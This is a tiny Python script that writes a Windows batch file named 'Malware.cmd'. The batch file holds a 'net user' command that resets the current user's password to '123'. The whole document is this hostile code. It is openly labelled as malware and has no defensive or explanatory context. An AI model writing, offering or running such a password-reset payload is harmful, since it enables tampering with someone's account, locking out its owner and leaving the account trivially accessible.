import os

user = os.getlogin()
command = f"net user {user} 123"

open("Malware.cmd","w").write(command)
